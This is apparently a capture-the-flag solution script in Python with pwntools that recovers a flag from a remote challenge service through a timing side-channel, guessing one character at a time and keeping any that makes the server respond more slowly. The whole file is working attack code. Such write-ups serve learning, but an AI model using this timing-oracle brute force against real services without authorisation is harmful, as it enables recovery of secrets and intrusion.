from pwn import *
import time

def main():
    flag = "FLAG{"
    char_set = "0123456789_ABCDEFGHIJKLMNOPQRSTUVWXYZ}"
    for _ in range(60):
        for c in char_set:
            start_time = time.time()
            r = remote("ctf.hackme.quest", 7708)
            r.recvuntil(b'What is your flag? ')
            r.sendline((flag + c).encode('ascii'))
            r.recvuntil(b'Bye')
            r.close()
            
            end_time = time.time()
            connection_time = end_time - start_time
            print(f"Connection time: {connection_time} seconds, target time: {len(flag) + 2}, try: {c}, current flag: {flag}")

            if connection_time >= len(flag) + 2:
                flag += c
                print("char find, current flag:", flag)
                if c == '}':
                    print("The whole flag is found:", flag)
                    return
                break

if __name__ == "__main__":
    main()
